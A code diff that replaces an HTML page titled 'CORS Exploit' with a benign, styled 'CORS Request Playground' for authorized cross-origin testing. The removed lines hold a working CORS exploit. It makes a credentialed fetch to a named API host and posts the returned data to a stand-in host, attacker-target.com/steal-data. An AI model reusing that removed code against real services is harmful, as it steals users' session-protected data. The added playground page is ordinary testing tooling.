@@ -1,40 +1,344 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CORS Request Playground</title>
+  <style>
+    :root {
+      color-scheme: light;
+      font-family: "Inter", "Segoe UI", system-ui, -apple-system, sans-serif;
+      background: #f5f7fb;
+      color: #0f172a;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 40px 20px 80px;
+    }
+
+    .container {
+      max-width: 960px;
+      margin: 0 auto;
+      display: grid;
+      gap: 24px;
+    }
+
+    header {
+      background: #ffffff;
+      padding: 28px 32px;
+      border-radius: 16px;
+      box-shadow: 0 12px 30px rgba(15, 23, 42, 0.08);
+    }
+
+    h1 {
+      margin: 0 0 12px;
+      font-size: 2.1rem;
+      letter-spacing: -0.03em;
+    }
+
+    p {
+      margin: 0;
+      color: #475569;
+      line-height: 1.6;
+    }
+
+    .grid {
+      display: grid;
+      gap: 20px;
+      grid-template-columns: minmax(0, 1fr);
+    }
+
+    @media (min-width: 900px) {
+      .grid {
+        grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
+      }
+    }
+
+    section {
+      background: #ffffff;
+      padding: 24px 28px;
+      border-radius: 16px;
+      box-shadow: 0 10px 24px rgba(15, 23, 42, 0.06);
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #1e293b;
+    }
+
+    input,
+    select,
+    textarea {
+      width: 100%;
+      padding: 10px 12px;
+      border-radius: 10px;
+      border: 1px solid #cbd5f5;
+      font-size: 0.98rem;
+      font-family: inherit;
+      background: #f8fafc;
+      color: #0f172a;
+    }
+
+    textarea {
+      min-height: 120px;
+      resize: vertical;
+    }
+
+    .row {
+      display: grid;
+      gap: 16px;
+    }
+
+    .row.two {
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    }
+
+    .controls {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      align-items: center;
+      margin-top: 16px;
+    }
+
+    button {
+      border: none;
+      padding: 12px 20px;
+      border-radius: 999px;
+      background: #1d4ed8;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      box-shadow: 0 12px 20px rgba(29, 78, 216, 0.18);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    button:hover:not(:disabled) {
+      transform: translateY(-1px);
+      box-shadow: 0 16px 25px rgba(29, 78, 216, 0.24);
+    }
+
+    .secondary {
+      background: #e2e8f0;
+      color: #0f172a;
+      box-shadow: none;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #e0f2fe;
+      color: #0369a1;
+      padding: 6px 12px;
+      border-radius: 999px;
+      font-weight: 600;
+      font-size: 0.85rem;
+      margin-bottom: 12px;
+    }
+
+    .notice {
+      background: #fef9c3;
+      border: 1px solid #facc15;
+      border-radius: 12px;
+      padding: 14px 16px;
+      color: #713f12;
+      font-size: 0.95rem;
+      line-height: 1.5;
+    }
+
+    pre {
+      background: #0f172a;
+      color: #e2e8f0;
+      padding: 16px;
+      border-radius: 12px;
+      overflow-x: auto;
+      min-height: 160px;
+      font-size: 0.9rem;
+    }
+
+    .status {
+      margin-top: 12px;
+      font-weight: 600;
+    }
+
+    .status.success {
+      color: #15803d;
+    }
+
+    .status.error {
+      color: #b91c1c;
+    }
+  </style>
 </head>
 <body>
-    <h1>CORS Exploit</h1>
-    <p>Click the button below to send a cross-origin request to the vulnerable API.</p>
-    <button id="exploitButton">Exploit CORS</button>
-    
-    <script>
-        // Function to trigger the exploit when the button is clicked
-        document.getElementById('exploitButton').addEventListener('click', function() {
-            // Craft a request to the vulnerable API that supports CORS misconfiguration
-            fetch('http://vera-devel.api.verily.com', {
-                method: 'GET',  // Use GET, POST, or any other method depending on the API
-                headers: {
-                    'Content-Type': 'application/json',  // Customize as needed
-                },
-                credentials: 'include'  // Include cookies (session tokens) and authentication with the request
-            })
-            .then(response => response.json())  // Parse the JSON response
-            .then(data => {
-                console.log('Sensitive Data:', data);  // Log the sensitive data or send it to the attacker
-                // If the server sends sensitive information, send it back to the attacker via another request
-                fetch('https://attacker-target.com/steal-data', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ stolenData: data })
-                });
-            })
-            .catch(error => console.error('Error:', error));  // Log any errors if they occur
-        });
-    </script>
+  <div class="container">
+    <header>
+      <span class="badge">CORS Request Playground</span>
+      <h1>Professional CORS demo for safe testing</h1>
+      <p>
+        Use this page to demonstrate how browsers enforce cross-origin rules. Configure a target endpoint
+        you own, send a request, and review the response headers. This is for authorized testing only.
+      </p>
+    </header>
+
+    <div class="grid">
+      <section>
+        <h2>Request setup</h2>
+        <div class="row">
+          <div>
+            <label for="requestUrl">Target URL</label>
+            <input
+              id="requestUrl"
+              type="url"
+              placeholder="https://api.example.com/profile"
+              value="https://api.example.com/profile"
+            />
+          </div>
+          <div class="row two">
+            <div>
+              <label for="requestMethod">HTTP method</label>
+              <select id="requestMethod">
+                <option>GET</option>
+                <option>POST</option>
+                <option>PUT</option>
+                <option>DELETE</option>
+              </select>
+            </div>
+            <div>
+              <label for="credentialsMode">Credentials</label>
+              <select id="credentialsMode">
+                <option value="omit">omit</option>
+                <option value="include">include</option>
+                <option value="same-origin">same-origin</option>
+              </select>
+            </div>
+          </div>
+          <div>
+            <label for="requestHeaders">Request headers (JSON)</label>
+            <textarea id="requestHeaders">{
+  "Content-Type": "application/json"
+}</textarea>
+          </div>
+          <div>
+            <label for="requestBody">Request body (JSON, optional)</label>
+            <textarea id="requestBody" placeholder='{ "example": true }'></textarea>
+          </div>
+        </div>
+        <div class="controls">
+          <button id="sendRequest">Send request</button>
+          <button id="clearOutput" class="secondary">Clear output</button>
+        </div>
+      </section>
+
+      <section>
+        <h2>Response output</h2>
+        <div class="notice">
+          Make sure you have permission to call the target API. Review response headers for
+          <strong>Access-Control-Allow-Origin</strong> and <strong>Access-Control-Allow-Credentials</strong>.
+        </div>
+        <pre id="responseOutput">Awaiting request...</pre>
+        <div id="statusMessage" class="status"></div>
+      </section>
+    </div>
+  </div>
+
+  <script>
+    const sendRequestButton = document.getElementById("sendRequest");
+    const clearOutputButton = document.getElementById("clearOutput");
+    const responseOutput = document.getElementById("responseOutput");
+    const statusMessage = document.getElementById("statusMessage");
+
+    const requestUrl = document.getElementById("requestUrl");
+    const requestMethod = document.getElementById("requestMethod");
+    const credentialsMode = document.getElementById("credentialsMode");
+    const requestHeaders = document.getElementById("requestHeaders");
+    const requestBody = document.getElementById("requestBody");
+
+    const formatJson = (value) => {
+      if (!value) return "";
+      try {
+        return JSON.stringify(JSON.parse(value), null, 2);
+      } catch (error) {
+        return value;
+      }
+    };
+
+    const setStatus = (message, type) => {
+      statusMessage.textContent = message;
+      statusMessage.className = `status ${type}`.trim();
+    };
+
+    const resetStatus = () => {
+      statusMessage.textContent = "";
+      statusMessage.className = "status";
+    };
+
+    const updateOutput = (payload) => {
+      responseOutput.textContent = payload;
+    };
+
+    clearOutputButton.addEventListener("click", () => {
+      updateOutput("Awaiting request...");
+      resetStatus();
+    });
+
+    sendRequestButton.addEventListener("click", async () => {
+      resetStatus();
+      sendRequestButton.disabled = true;
+      updateOutput("Sending request...");
+
+      let headers = {};
+      try {
+        headers = requestHeaders.value ? JSON.parse(requestHeaders.value) : {};
+      } catch (error) {
+        updateOutput("Header JSON is invalid. Please provide valid JSON.");
+        setStatus("Invalid header JSON.", "error");
+        sendRequestButton.disabled = false;
+        return;
+      }
+
+      const options = {
+        method: requestMethod.value,
+        headers,
+        credentials: credentialsMode.value,
+      };
+
+      if (requestBody.value.trim()) {
+        options.body = requestBody.value.trim();
+      }
+
+      try {
+        const response = await fetch(requestUrl.value, options);
+        const responseText = await response.text();
+        const output = {
+          status: response.status,
+          statusText: response.statusText,
+          headers: Object.fromEntries(response.headers.entries()),
+          body: formatJson(responseText),
+        };
+        updateOutput(JSON.stringify(output, null, 2));
+        setStatus("Request completed.", "success");
+      } catch (error) {
+        updateOutput(`Request failed.\n${error}`);
+        setStatus("Request failed.", "error");
+      } finally {
+        sendRequestButton.disabled = false;
+      }
+    });
+  </script>
 </body>
 </html>
